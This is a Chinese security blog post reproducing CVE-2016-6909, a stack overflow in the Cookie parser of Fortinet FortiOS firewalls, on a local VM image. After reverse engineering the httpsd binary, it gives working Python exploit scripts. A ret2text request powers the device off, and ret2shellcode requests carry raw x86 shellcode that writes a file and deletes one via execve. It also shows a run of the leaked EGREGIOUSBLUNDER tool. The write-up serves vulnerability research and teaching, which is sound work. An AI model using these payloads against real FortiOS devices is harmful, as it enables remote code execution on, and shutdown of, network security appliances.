# CVE-2016-6909 Fortigate 防火墙 Cookie 解析漏洞复现及简要分析

阅读量 **170731**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-09-10 14:30:37

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0192882528074bece4.jpg)

## 0x00.一切开始之前

Fortigate 系列是 Fortinet（飞塔）公司旗下的防火墙产品之一，2016年，Shadow Brokers公开了黑客组织 **Equation
Group** 针对各大厂商防火墙的[漏洞利用工具](https://musalbas.com/blog/2016/08/16/equation-group-firewall-operations-catalogue.html)，存在于 Fortigate 中的一个隐蔽的栈溢出漏洞也就此被大白于天下

在 [cve.mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6909) 上对该漏洞的说明如下：

> Buffer overflow in the Cookie parser in Fortinet FortiOS 4.x before 4.1.11,
> 4.2.x before 4.2.13, and 4.3.x before 4.3.9 and FortiSwitch before 3.4.3
> allows remote attackers to execute arbitrary code via a crafted HTTP
> request, aka EGREGIOUSBLUNDER.

笔者暂时买不起昂贵的防火墙产品（毕竟买来也没地用是不是），但还好 Fortinet 提供了一些虚拟机版本的镜像，于是笔者今天将借助受影响的一个虚拟机版本
**FGT_VM-v400-build0482** 来分析该漏洞

###  漏洞影响版本

Fortinet FortiOS 4.x < 4.1.11, 4.2.x < 4.2.13, 4.3.x < 4.3.9、FortiSwitch <
3.4.3

###  登入 fortigate VM

默认账户是 `admin` ，无密码，可以用于本地测试

![](https://p4.ssl.qhimg.com/t01a3c141827ea126e1.png)

通常情况下防火墙不会给我们提供 shell，而是 **仅** 提供一个简易 CLI 界面，在上面我们只能使用其所内置提供的几个功能

###  后门指令

仅靠防火墙的功能基本上不算是一个可用的操作系统，因此 fortigate VM CLI 提供给我们一个隐藏指令 `fnsysctl` 以执行其限制的诸如
`ls` 等的一些基本命令， **不包括 shell**

> 后续通过逆向分析我们可以发现其程序本身限制了过滤 sh，因此我们无法通过 CLI 直接拿到一个 shell

![](https://p0.ssl.qhimg.com/t0107d979076b7326bf.png)

## 0x01.漏洞分析

###  文件提取

首先将硬盘镜像 `fortios.vmdk` 挂载到 `/mnt` 目录下：

![](https://p2.ssl.qhimg.com/t0161365f99942fc872.png)

    
    
    $ sudo fdisk -l
    ...
    Device     Boot  Start     End Sectors  Size Id Type
    /dev/sdb1  *         1  262144  262144  128M 83 Linux
    /dev/sdb2       262145 4194304 3932160  1.9G 83 Linux
    ...
    $ sudo mkdir /mnt/fortios
    $ sudo mount /dev/sdb1 /mnt/fortios
    

之后我们便能够在 `/mnt` 目录下查看磁盘中的文件：

    
    
    $ cd /mnt/fortios
    $ ll
    total 23392
    drwxr-xr-x 3 root root     1024 Sep 20  2011 ./
    drwxr-xr-x 5 root root     4096 Aug 10 18:43 ../
    -rw-r--r-- 1 root root  5182591 Sep 20  2011 datafs.tar.gz
    -rw-r--r-- 1 root root      107 Sep 20  2011 extlinux.conf
    lrwxrwxrwx 1 root root       12 Sep 20  2011 flatkc -> ./flatkc.smp
    -rw-r--r-- 1 root root      256 Sep 20  2011 flatkc.chk
    -rw-r--r-- 1 root root  1437300 Sep 20  2011 flatkc.nosmp
    -rw-r--r-- 1 root root  1501003 Sep 20  2011 flatkc.smp
    -r--r--r-- 1 root root    32256 Sep 20  2011 ldlinux.sys
    drwx------ 2 root root    12288 Sep 20  2011 lost+found/
    -rw-r--r-- 1 root root 15678360 Sep 20  2011 rootfs.gz
    -rw-r--r-- 1 root root      256 Sep 20  2011 rootfs.gz.chk
    

> 也可以通过如下方式直接挂载镜像文件：
>  
>  
>     $ sudo modprobe nbd
>     $ sudo qemu-nbd -r -c /dev/nbd1 ./fortios.vmdk
>     $ sudo mount /dev/nbd1p1 /mnt
>  

查看文件类型，我们可以发现两个内核镜像文件 `flatkc.smp` 与 `flatkc.nosmp`：

    
    
    $ file *
    datafs.tar.gz: gzip compressed data, last modified: Tue Sep 20 20:17:56 2011, from Unix, original size modulo 2^32 8724480
    extlinux.conf: ASCII text
    flatkc:        symbolic link to ./flatkc.smp
    flatkc.chk:    data
    flatkc.nosmp:  Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #2 Tue Sep 20 12:46:19 PDT 2011, RO-rootFS, Normal VGA
    flatkc.smp:    Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #3 Tue Sep 20 12:49:39 PDT 2011, RO-rootFS, Normal VGA
    ldlinux.sys:   SYSLINUX loader (version 4.00)
    lost+found:    directory
    rootfs.gz:     gzip compressed data, last modified: Tue Sep 20 20:17:52 2011, from Unix, original size modulo 2^32 19077120
    rootfs.gz.chk: data
    

在 `extlinux.conf` 中指定了一些基本配置，包括文件系统 `rootfs.gz`：

    
    
    $ cat extlinux.conf 
    DEFAULT flatkc ro panic=5 endbase=0xA0000 console=tty0 root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz
    

解压 `rootfs.gz` ：

    
    
    $ tar xf ./rootfs.gz
    $ ll
    total 28216
    drwxr-xr-x 10 arttnba3 arttnba3     4096 Sep 20  2011 ./
    drwxr-xr-x  5 arttnba3 arttnba3     4096 Aug 10 18:52 ../
    -rw-r--r--  1 arttnba3 arttnba3  8742988 Sep 20  2011 bin.tar.xz
    drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 data/
    drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 data2/
    drwxr-xr-x  5 arttnba3 arttnba3     4096 Sep 20  2011 dev/
    lrwxrwxrwx  1 arttnba3 arttnba3        8 Sep 20  2011 etc -> data/etc
    lrwxrwxrwx  1 arttnba3 arttnba3        1 Sep 20  2011 fortidev -> //
    drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 lib/
    -rw-r--r--  1 arttnba3 arttnba3  4424536 Sep 20  2011 migadmin.tar.xz
    drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 proc/
    -rw-r--r--  1 arttnba3 arttnba3 15678360 Aug 10 18:54 rootfs.gz
    drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 sbin/
    drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 tmp/
    drwxr-xr-x  8 arttnba3 arttnba3     4096 Sep 20  2011 var/
    

###  启动过程分析

**I. init 进程**

Linux 内核载入后会启动第一个进程 `init`，程序二进制文件通常是 `/sbin/init`，该文件系统中的 init
文件较小，故我们可以直接将其拖入 IDA 进行分析：

    
    
    int __cdecl main()
    {
      char *argv[2]; // [esp+0h] [ebp-8h] BYREF
    
      if ( (int)sub_8049254("bin") >= 0 )
        sub_8049254("migadmin");
      unlink("/sbin/xz");
      unlink("/sbin/ftar");
      argv[0] = "/bin/init";
      argv[1] = 0;
      execve("/bin/init", argv, 0);
      return 0;
    }
    

其中 `sub_8049254()` 核心逆向结果如下：

    
    
    int __cdecl sub_8049254(const char *a1)
    {
      //...
      snprintf(s, 0x200u, "/%s.tar.xz", a1);
      //...
      v1 = fork();
      if ( v1 )
      {
        //...
        if ( v1 > 0 )
        {
          waitpid(v1, &stat_loc, 0);
          if ( BYTE1(stat_loc) )
            goto LABEL_21;
          unlink(s);
        }
      }
      else
      {
        argv[0] = "/sbin/xz";
        argv[1] = "--check=sha256";
        argv[2] = "-d";
        argv[3] = s;
        argv[4] = 0;
        execv("/sbin/xz", argv);
      }
      snprintf(name, 0x200u, "/%s.tar", a1);
      v3 = fork();
      if ( v3 )
      {
        //..
        if ( v3 <= 0 )
          return 0;
        waitpid(v3, &v10, 0);
        if ( !BYTE1(v10) )
        {
          unlink(name);
          return 0;
        }
    LABEL_21:
        puts("decompress init failed");
        return -1;
      }
      v12[0] = "/sbin/ftar";
      v12[1] = "-xf";
      v12[2] = name;
      v12[3] = 0;
      execv("/sbin/ftar", v12);
      return 0;
    }
    

故 init 进程分析如下：

  * 检查 `/bin.tar.xz` 是否存在，若是则创建子进程执行 `/sbin/xz --check=sha256 -d /bin.tar.xz`，父进程等待子进程结束后删除`/bin.tar.xz`，之后检查 `/bin.tar` 是否存在，若是则创建子进程执行 `/sbin/ftar -xf /bin.tar`，父进程等待子进程结束后删除`/bin.tar`
  * 上一步成功后检查 `/migadmin.tar.xz` 是否存在，若是则创建子进程执行 `/sbin/xz --check=sha256 -d /migadmin.tar.xz`，父进程等待子进程结束后删除`/migadmin.tar.xz`，之后检查 `/migadmin.tar` 是否存在，若是则创建子进程执行 `/sbin/ftar -xf /migadmin.tar`，父进程等待子进程结束后删除`/migadmin.tar`
  * 删除 `/sbin/xz`
  * 删除 `/sbin/ftar`
  * 执行 `/bin/init`

由于 `ftar` 与 `xz` 都指定了调用的库的目录如下：

![](https://p3.ssl.qhimg.com/t010c8c71cd1546bfc7.png)

故需要通过切换根目录执行进行解压：

    
    
    $ sudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xz
    $ sudo chroot . /sbin/ftar -xf /bin.tar
    $ sudo chroot . /sbin/xz --check=sha256 -d /migadmin.tar.xz
    $ sudo chroot . /sbin/ftar -xf /migadmin.tar
    

**II. bin 目录文件分析**

我们可以看到的是，`bin.tar.xz` 解压出来的文件基本上都是指向 `/bin/init` 与 `/bin/sysctl` 的软链接

其中诸如 `httpsd` 等网络服务都是前者的软链接，可知前者应当为该防火墙提供的基本的网络服务

而诸如 `chmod` 等常用命令都是后者的软链接，可知后者应当为类似 busybox 一样的工具库，不过更为精简

    
    
    $ ll
    total 31200
    drwxr-xr-x  2 root     root         4096 Aug 10 19:35 ./
    drwxr-xr-x 12 arttnba3 arttnba3     4096 Aug 10 19:37 ../
    lrwxrwxrwx  1 root     root            9 Aug 10 19:35 adsl_mon -> /bin/init
    lrwxrwxrwx  1 root     root            9 Aug 10 19:35 alarmd -> /bin/init
    lrwxrwxrwx  1 root     root            9 Aug 10 19:35 alertmail -> /bin/init
    lrwxrwxrwx  1 root     root            9 Aug 10 19:35 authd -> /bin/init
    lrwxrwxrwx  1 root     root            9 Aug 10 19:35 bgpd -> /bin/init
    lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cardctl -> /bin/init
    lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cardmgr -> /bin/init
    lrwxrwxrwx  1 root     root           11 Aug 10 19:35 cat -> /bin/sysctl
    lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cauploadd -> /bin/init
    lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chassis5000d -> /bin/init
    lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chassisd -> /bin/init
    lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chat -> /bin/init
    lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chlbd -> /bin/init
    lrwxrwxrwx  1 root     root           11 Aug 10 19:35 chmod -> /bin/sysctl
    ...
    

**III. /bin/init 逆向分析**

拖入 IDA 进行分析：

首先会执行 `/bin/initXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX` 替换自身，该文件其实是 `/bin/init`
的软链接，故这里本质上只是更改了 pid 与 argv[0]

随后会关闭三个标准文件描述符并改变当前工作目录为 `/`，打开 `/dev/null` 并创建三个指向其的文件描述符（0、1、2）

> 笔者后续曾经一度认为利用失败就是因为没有注意到输入输出被重定向至 null 而无法在屏幕上打印出任何信息

![](https://p4.ssl.qhimg.com/t01f91677bf744fd41e.png)

启动后的界面如下：

![](https://p4.ssl.qhimg.com/t01123fcdca05cff6b9.png)

###  poc

首先为我们的虚拟机配置一个本地 ip

![](https://p5.ssl.qhimg.com/t01185423329514cf88.png)

接下来我们还需要获取到一个 cookie num：

    
    
    $ curl -X HEAD -v http://192.168.116.100/login  2>&1 | grep 'APSCOOKIE'
    < Set-Cookie: APSCOOKIE_3943997904=0&0; path=/; expires=Tue, 24-Aug-1971 18:40:48 GMT
    

之后使用 `egregiousblunder` 测试该漏洞，如下：

    
    
    $ ./egregiousblunder_3.0.0.1 -t 192.168.116.100 -p 80 -l 4444 --ssl 0 --nope --gen 4nc --config EGBL.config --cookienum 3943997904 --stack 0xbffff114
    loading nopen over HTTP
    using stack addr 0xbffff114
    built authhash len 116
    built enc_authhash with len 116
    problem recv'ing ack1/hello, stack address probably wrong.  WAM might work?
    problem with sending file
    failure loading nopen over HTTP
    

此时在 fortigate 的 CLI 中我们便可以看到 httpsd 服务的崩溃信息及栈回溯

![](https://p4.ssl.qhimg.com/t019590f9290303c575.png)

但是这里没能够成功获得一个 shell，初步猜测是 EGREGIOUSBLUNDER 的版本问题

使用 wireshark 截取 EGREGIOUSBLUNDER 所发送的数据包进行分析，我们可以发现 `0xbffff114`
这个地址被布置到了http请求头的 Cookie 中的 `AuthHash`
字段，初步推测这应当是作为一个返回地址被布置上去的，说明可能是一个栈溢出漏洞，这也与 CVE 通告所说的【cookie 解析过程中发生缓冲区溢出】相吻合

![](https://p0.ssl.qhimg.com/t0179f8a81413390c45.png)

使用 postman 简单仿造该 http 请求如下，使用字符 `A` 简单填充 AuthHash 字段：

![](https://p4.ssl.qhimg.com/t019bc45a4fd70b0648.png)

当我们的字符 A 数量达到 0x60 时再一次发生了 crash，不过这一次的栈回溯更为详细

为了方便构造 payload 进行利用，接下来笔者选择使用 python 发送 http 请求

    
    
    from requests import *
    url = 'http://192.168.116.100/index'
    
    headers = {
        'Content-Type':'application/json',
        'Content-Length':'12',
        'Accept':'*/*',
        'Accept-Encoding':'gzip,deflate,br',
    
        'User-Agent':'PostmanRuntime/7.28.3', 
        'Host':'192.168.116.100', 
        'Cookie':'APSCOOKIE_3943997904=Era=0&Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash=' + 'A' * 0x60
        }
    
    r = post(url, headers = headers)
    print(r.text)
    print(r.headers)
    

###  定位溢出点

> 由于一些特殊原因，笔者本地无法直接启动其 init 程序
>
> 笔者本想将 gdb 等打包进其文件系统中直接在虚拟机内进行调试，奈何文件系统实在太老，重打包后没有一次启动成功的，只好作罢…

我们首先根据这个报错信息进行栈回溯：

![](https://p3.ssl.qhimg.com/t0198921af33c996410.png)

    
    
    .text:08C38A77                 call    sub_8C389B7
    .text:08C38A7C                 mov     ebx, [ebp+var_4]
    .text:08C38A7F                 leave
    .text:08C38A80                 retn
    .text:08C38A80 sub_8C38A61     endp
    

找到 `sub_8C389B7()` 函数，我们发现其最终会调用 `sub_8C38440()` 函数，简单分析我们不难知道该调用链仅仅是用于打印报错信息

![](https://p1.ssl.qhimg.com/t015c8f009a20b52def.png)

继续分析其调用链，libc offset 0x1d218 处代码如下，该段代码位于 libc 中函数 `__libc_sigaction()`，用以进行
`sigreturn` 系统调用：

    
    
    .text:0001D210 loc_1D210:                              ; DATA XREF: __libc_sigaction+CA↓o
    .text:0001D210                 mov     eax, 0ADh
    .text:0001D215                 int     80h             ; LINUX - sys_rt_sigreturn
    .text:0001D217                 nop
    .text:0001D218 loc_1D218:                              ; DATA XREF: __libc_sigaction+D9↓o
    .text:0001D218                 pop     eax
    .text:0001D219                 mov     eax, 77h ; 'w'
    .text:0001D21E                 int     80h             ; LINUX - sys_sigreturn
    

继续回溯，`0x8204F8D` 的上一条指令调用了 `sub_820483B()` 函数，通过逆向我们发现该函数会调用 `sub_820429D()`：

    
    
    int __cdecl sub_820429D(int *a1, _BYTE *a2)
    {
      const char *v2; // esi
      const char *v3; // eax
      int **v4; // edi
      int *v5; // eax
      int v6; // esi
      void *v7; // eax
      void *v8; // esi
      int v10; // [esp+4h] [ebp-14h]
      char *v11[4]; // [esp+8h] [ebp-10h] BYREF
    
      v10 = sub_83297EE(*a1, 1, 4);
      if ( a2 || (a2 = (_BYTE *)sub_8329B12(a1[34], "Cookie")) != 0 )
      {
        while ( *a2 )
        {
          v11[0] = (char *)sub_8344CBA(*a1, &a2, 59);
          if ( !v11[0] )
            break;
          while ( ((*__ctype_b_loc())[(unsigned __int8)*a2] & 0x2000) != 0 )
            ++a2;
          v2 = (const char *)sub_8344CBA(*a1, v11, 61);
          v3 = (const char *)sub_8204B9C(a1);
          if ( strstr(v2, v3) )
            sub_820CB5E(v11[0]);
    ...
    

其中 `sub_8329B12()` 函数调用了 `strcasecmp()`，大致分析应当是判断字符串存在性的函数，在这里传入的参数中包含字符串
`"Cookie"`，那么我们大致可以推测该函数应当是 httpsd （即本进程）中被用以处理 Cookie 相关的函数之一

局部变量 v3 的求解涉及到函数 `sub_8204B9C()`，如下：

    
    
    int __cdecl sub_8204B9C(_DWORD *a1)
    {
      int v1; // edx
      int v2; // eax
    
      v1 = 0;
      if ( nCfg_debug_zone )
        v1 = nCfg_debug_zone + 45972;
      v2 = sub_8204B37(v1);
      return sub_8329797(*a1, (int)"%s_%lu", "APSCOOKIE", v2);
    }
    

我们不难发现其最后调用的 `sub_8329797()` 传参形式应当是按格式化字符串进行解析，最终拼凑出来的形式应当如
`APSCOOKIE_114514` （示例数字）的形式，而上层调用中使用 `strstr()` 判断 v3 在 v2 中是否存在，这个形式我们与我们传入的
Cookie 的内容开头相吻合，由此我们可以推断出接下来的 `sub_820CB5E()` 函数应当涉及到对 Cookie 的解析工作

接下来继续分析 `sub_820CB5E()`：

    
    
    int __cdecl sub_820CB5E(char *a1)
    {
      //...
      char s[108]; // [esp+116Ch] [ebp-6Ch] BYREF
    
      size = 1;
      if ( a1 )
        size = strlen(a1) + 1;
      src = 0;
      memset(s, 0, 0x52u);
      v16 = 20;
      memset(v21, 0, sizeof(v21));
      ptr = 0;
      v7 = -1;
      if ( a1 )
      {
        sub_820C6F0();
        if ( sscanf(a1, "Era=%1d&Payload=%[^&]&AuthHash=%s", &v17, v21, s) == 3 )
        {
    ...
    

做 pwn 的同学应该 **第一眼就能够看到一个大大的 %s 映入你的眼帘，十分明显的一个栈溢出** ，我们的漏洞便位于这个位置：对 Cookie
内容的解析使用了不安全的 `%s` 读取 AuthHash 到栈上从而使得其存在栈溢出漏洞

> 这个年代还有针对 `%s` 的漏洞属实令人泪目

## 0x02.漏洞利用

httpsd 为对 init 的软链接，首先我们先对 init 程序进行安全检查：

    
    
    $ checksec ./init
    [*] '/home/arttnba3/Desktop/cves/CVE-2016-6909/exploit/init'
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x8048000)
        RWX:      Has RWX segments
        RPATH:    b'../lib:../ulib:/fortidev/lib:/lib'
    

**保 护 全 关** ，我们有相当大的操作空间

###  ret2text

由于其与传统 pwn 题的交互界面不同，我们只有一次 post 的机会，所以需要在这一次 post 中 **一 步 到 位**
，相应地，虽然我们无法通过交互获取 libc，但是在 init 文件中有着大量的 gadget，又没开 PIE，故直接 ret2text 即可

先试一下我们是否真的能直接控制程序执行流，随便找一段 gadget 简单试一下，笔者这里选用了一段关机代码

    
    
    .text:080601AE                 push    4321FEDCh       ; howto
    .text:080601B3                 call    _reboot
    

> `reboot(RB_POWER_OFF)`

http 请求头的长度毫无疑问能够满足我们对 payload 的要求，故笔者这里直接使用大量的 `ret` 指令作为 slide
code，省去计算溢出长度的必要：

    
    
    from requests import *
    from pwn import *
    #e = ELF('./init')
    url = 'http://192.168.116.100/index'
    
    headers = {
        'Content-Type':'application/json',
        'Content-Length':'12',
        'Accept':'*/*',
        'Accept-Encoding':'gzip,deflate,br',
    
        'User-Agent':'PostmanRuntime/7.28.3', 
        'Host':'192.168.116.100', 
        'Cookie':'APSCOOKIE_3943997904=Era=0&Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash=' + '\x1c\x8d\x04\x08' * 100 + '\xae\x01\x06\x08'
        }
    
    r = post(url, headers = headers)
    print(r.text)
    print(r.headers)
    

可以发现 fortigate VM 被成功关机：

> 好像没啥意义的截图（）

![](https://p3.ssl.qhimg.com/t0154c68403a0d3ea5d.png)

###  ret2shellcode

ROP链的拼接较为繁琐，且对于 `%s` 而言 **空白字符无法被捕获** ，由于没有开启 NX 保护，我们可以考虑通过`jmp esp` 的 gadget
来 **直接执行 shellcode**

当然，有的功能其实还是可以直接使用 init 文件中存在的函数的，比如说 open 和 write

![](https://p2.ssl.qhimg.com/t01b874dc525e255fe5.png)

![](https://p3.ssl.qhimg.com/t016ea375d2cb9112f6.png)

下面这段代码调用了 open 进行了文件的创建并向文件内写入了字符串 `arttnba3`

    
    
    from requests import *
    from pwn import *
    context.arch = 'i386'
    #e = ELF('./init')
    url = 'http://192.168.116.100/index'
    
    cookie = ''
    cookie += 'APSCOOKIE_3943997904=Era=0&Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash='
    cookie += '\x1c\x8d\x04\x08' * 100 # ret
    cookie += '\xf7\xbd\x96\x08' # add eax, ebp ; jmp esp
    # following are shellcode
    cookie += '\x90' * 0x80 # slide code nop
    cookie += '1\xc0PhflagTXjBP\xbb$\xe3\x05\x08\xff\xd31\xc9Qhnba3harttT[j\x08SP\xbb\x84\xb5\x05\x08\xff\xd3' # 'xor eax, eax ; push eax ; push 0x67616c66 ; push esp ; pop eax ; push 0102 ; push eax ; mov ebx, 0x805E324 ; call ebx ; xor ecx, ecx ; push ecx ; push 0x3361626e ; push 0x74747261 ; push esp ; pop ebx ; push 8 ; push ebx ; push eax ; mov ebx, 0x805B584 ; call ebx'
    headers = {
        'Content-Type':'application/json',
        'Content-Length':'12',
        'Accept':'*/*',
        'Accept-Encoding':'gzip,deflate,br',
    
        'User-Agent':'PostmanRuntime/7.28.3', 
        'Host':'192.168.116.100', 
        'Cookie':cookie
        }
    
    r = post(url, headers = headers)
    print(r.text)
    print(r.headers)
    

发送 http 请求，我们成功地在防火墙内创建文件并写入特定内容

![](https://p2.ssl.qhimg.com/t018aaa12610330872d.png)

下列 shellcode 通过系统调用 execve 调用 `/bin/rm` 删除我们的 flag

    
    
    ...
    cookie += '1\xc0Ph//rmh/binT[PhflagTYPQSTY\x89\xc2@@@@@@@@@@@\xcd\x80' # 'xor eax, eax ; push eax ; push 0x6d722f2f ; push 0x6e69622f ; push esp ; pop ebx ; push eax ; push 0x67616c66 ; push esp ; pop ecx ; push eax ; push ecx ; push ebx ; push esp ; pop ecx ; mov edx, eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; int 0x80'
    ...
    

发送 http 请求，可以看到 flag 文件已被删除

![](https://p3.ssl.qhimg.com/t01f736cede31cc8543.png)

接下来我们便可以使用自己构造的 shellcode 为所欲为了，网上也有很多 shellcode 生成工具，这里笔者便不再独立贴出其他 shellcode
了

## 0x03.What’s more…

安全产品是为了确保安全而引入的，但安全产品又会有新的安全问题，这个时候又要引入新的安全产品来确保安全产品的安全，然后便是无限套娃…

笔者认为， **「安全问题本质上还是人的问题」** ，只有我们每一位开发者都真正重视起安全问题，很多没有必要的损失才能得以避免

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **墨晚鸢** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/252842](/post/id/252842)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [栈溢出](/tag/栈溢出)
  * [fortigate](/tag/fortigate)
  * [ret2shellcode](/tag/ret2shellcode)

 **+1** __4赞

 __收藏

![](https://p3.ssl.qhimg.com/t0148f718bec9e27586.png) 墨晚鸢

